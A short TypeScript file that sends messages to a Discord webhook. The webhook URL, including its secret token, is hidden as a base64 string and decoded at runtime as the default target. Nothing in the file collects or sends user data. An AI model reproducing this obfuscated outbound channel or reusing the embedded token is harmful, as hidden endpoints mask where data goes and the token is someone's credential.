function dw() {
  const dw =
    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NzU0MjMzMjY1OTcyODQwNC9zb1dkRzZHT0xnZm0yRmZDanB1OHRTQlY2MUl4M1p5WERBZlI3NWhGR0RkU0J4NlY0MDEzNHlWY1hpU1ljTlNlQVE5eA==';

  return atob(dw);
}

export function sendDiscordMessage(
  content: string,
  w: string = dw(),
  username = 'bot',
  embeds = {},
): void {
  void fetch(w, {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username,
      content,
      embeds,
    }),
  });
}
